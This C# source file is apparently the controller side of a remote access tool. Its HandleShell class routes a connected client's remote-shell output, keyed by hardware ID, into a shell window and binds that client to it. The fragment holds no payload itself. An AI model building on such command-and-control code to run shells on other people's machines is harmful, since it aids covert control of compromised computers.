using System.Windows.Forms;
using Server.Connection;
using Server.Forms;
using Server.MessagePack;

namespace Server.Handle_Packet
{
    public class HandleShell
    {
        public HandleShell(MsgPack unpack_msgpack, Clients client)
        {
            var shell = (FormShell)Application.OpenForms["shell:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
            if (shell != null)
            {
                if (shell.Client == null)
                {
                    shell.Client = client;
                    shell.timer1.Enabled = true;
                }

                shell.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("ReadInput").AsString);
                shell.richTextBox1.SelectionStart = shell.richTextBox1.TextLength;
                shell.richTextBox1.ScrollToCaret();
            }
        }
    }
}